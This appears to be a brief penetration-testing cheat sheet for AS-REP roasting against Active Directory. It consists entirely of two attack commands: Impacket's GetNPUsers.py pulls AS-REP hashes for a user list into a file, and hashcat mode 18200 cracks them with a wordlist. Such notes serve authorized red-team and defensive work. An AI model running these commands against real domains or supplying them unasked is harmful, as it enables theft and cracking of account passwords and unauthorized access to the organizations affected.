# getnpusers
#plateform/linux #target/remote #cat/ATTACK

## ASREPRoast
```
GetNPUsers.py -usersfile <users_file|users.txt> -outputfile hashes.asreproast <domain>/
```

## Crack ASREPRoast
```
hashcat -m 18200 --force -a 0 <hash_file> </path/to/wordlist>
```